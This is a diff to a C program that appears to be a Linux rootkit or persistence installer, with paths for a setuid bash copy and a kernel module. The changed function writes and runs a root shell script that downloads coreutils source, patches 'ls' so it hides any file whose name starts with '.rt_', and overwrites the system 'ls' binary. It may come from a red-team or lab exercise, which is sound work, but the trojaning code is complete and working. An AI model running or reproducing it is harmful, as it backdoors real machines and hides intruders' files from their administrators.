@@ -7,6 +7,7 @@
 #include <dirent.h> 
 #include <string.h>
 #include <stdbool.h>
+#include <sys/wait.h>
 
 #ifdef FILENAME_MAX
     #define FILENAME_LEN FILENAME_MAX
@@ -33,8 +34,10 @@
 #define WORKING_DIR "/tmp"
 
 // Useful Macros (modify these if path changes made elsewhere)
+#define APT_SOURCES_DIRECTORY // remove this if still using /etc/apt/sources.list
+
 #define SETUID_BASH_PATH "/lib/gcc/rt_bash"
-#define ICMPK_PATH "/" // /lib/modules?
+#define ICMPK_PATH "/lib/modules"
 
 #define HTTP_DOCUMENT_ROOT "/var/www/html"
 
@@ -135,48 +138,92 @@ int re_processd(void){
 ////////////////////////////////////////
 ////////// Broken ls
 ////////////////////////////////////////
-static char *ls_commands[] = { "sed -i -e 's/# deb-src/deb-src/' /etc/apt/sources.list", 
-    "apt update", 
-    "apt-get source -y coreutils && apt-get build-dep -y coreutils", 
-    "cd coreutils-*", 
-    "yes | autoreconf -fiv", 
-    "FORCE_UNSAFE_CONFIGURE=1 ./configure --prefix=/usr --disable-silent-rules", 
-        "awk 'BEGIN { \n" 
-        "  found = 0; inserted = 0\n" 
-        "} \n" 
-        "/file_ignored \\(char const \\*name\\)$/ { \n"
-        "  print $0\n"
-        "  found = 1\n" 
-        "  next\n"
-        "} \n" 
-        "found == 1 && inserted == 0 && $0 == \"{\" { \n" 
-        "  print $0\n"
-        "  print \"  if (strncmp(name, \\\".rt_\\\", 3) == 0) { return true; }\"\n" 
-        "  inserted = 1\n"
-        "  found = 2\n"
-        "  next\n"
-        "} \n"
-        "{ print $0 }' src/ls.c > tempfile && mv tempfile src/ls.c", 
-    "make -j`nproc`", 
-    "echo \"Replacing ls\"", 
-    "cp src/ls `which ls`", 
-    "cd ..",
-    NULL
-};
+#ifndef APT_SOURCES_DIRECTORY
+static const char *ls_commands = "#!/bin/bash\n"
+    "\n"
+    "sed -i -e 's/# deb-src/deb-src/' /etc/apt/sources.list\n"
+    "apt update\n"
+    "apt-get source -y coreutils && apt-get build-dep -y coreutils\n"
+    "cd coreutils-*\n"
+    "yes | autoreconf -fiv\n"
+    "FORCE_UNSAFE_CONFIGURE=1 ./configure --prefix=/usr --disable-silent-rules\n"
+    "awk '\n"
+    "BEGIN { \n"
+    "  found = 0; inserted = 0 \n"
+    "} \n"
+    "/\\/file_ignored \\(char const \\*name\\)$/ { \n"
+    "  print $0\n"
+    "  found = 1\n"
+    "  next\n"
+    "} \n"
+    "found == 1 && inserted == 0 && $0 == \"{\" { \n"
+    "  print $0\n"
+    "  print \"  if (strncmp(name, \\\".rt_\\\", 3) == 0) { return true; }\"\n"
+    "  inserted = 1\n"
+    "  found = 2\n"
+    "  next\n"
+    "} \n"
+    "{ print $0 }\n"
+    "' src/ls.c > tempfile && mv tempfile src/ls.c\n"
+    "make -j$(nproc)\n"
+    "echo \"Replacing ls\"\n"
+    "cp src/ls $(which ls)\n"
+    "cd ..\n";
+#else
+static const char *ls_commands = "#!/bin/bash\n"
+    "\n"
+    "sed -i -e 's/Types: deb/Types: deb deb-src/' /etc/apt/sources.list.d/ubuntu.sources\n"
+    "apt update\n"
+    "apt install -y dpkg-dev\n"
+    "apt-get source -y coreutils && apt-get build-dep -y coreutils\n"
+    "cd coreutils-*\n"
+    "yes | autoreconf -fiv\n"
+    "FORCE_UNSAFE_CONFIGURE=1 ./configure --prefix=/usr --disable-silent-rules\n"
+    "awk '\n"
+    "BEGIN { \n"
+    "  found = 0; inserted = 0 \n"
+    "} \n"
+    "/\\/file_ignored \\(char const \\*name\\)$/ { \n"
+    "  print $0\n"
+    "  found = 1\n"
+    "  next\n"
+    "} \n"
+    "found == 1 && inserted == 0 && $0 == \"{\" { \n"
+    "  print $0\n"
+    "  print \"  if (strncmp(name, \\\".rt_\\\", 3) == 0) { return true; }\"\n"
+    "  inserted = 1\n"
+    "  found = 2\n"
+    "  next\n"
+    "} \n"
+    "{ print $0 }\n"
+    "' src/ls.c > tempfile && mv tempfile src/ls.c\n"
+    "make -j$(nproc)\n"
+    "echo \"Replacing ls\"\n"
+    "cp src/ls $(which ls)\n"
+    "cd ..\n";
+#endif
 int re_broken_ls(void){
-    char *argv[] = { "/bin/bash", "-c", NULL, NULL};
-    char *envp[] = {
-        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin",
-        NULL
-    };
+    // requires /bin/bash to exist
+    int fp;
+    pid_t pid;
 
-    char **current_string = ls_commands;
-    while (*current_string) {
-        argv[2] = *current_string++;
-        if (execve(argv[0], argv, envp) == -1) {
-            perror("execle failed");
+    fp = creat("/tmp/create_broken_ls.sh", 0555);
+    write(fp, ls_commands, strlen(ls_commands));
+    close(fp);
+    
+    pid = fork();
+    if (pid < 0) {
+        perror("fork");
+        return 1;
+    } else if (pid == 0){ // child
+        if(execle("/bin/bash", "bash", "/tmp/create_broken_ls.sh", NULL, (char* []){ NULL })){
+            perror("execle");
+            exit(EXIT_FAILURE);
         }
-    };
+    }
+
+    // Parent
+    wait(NULL);
     return 0;
 }
 
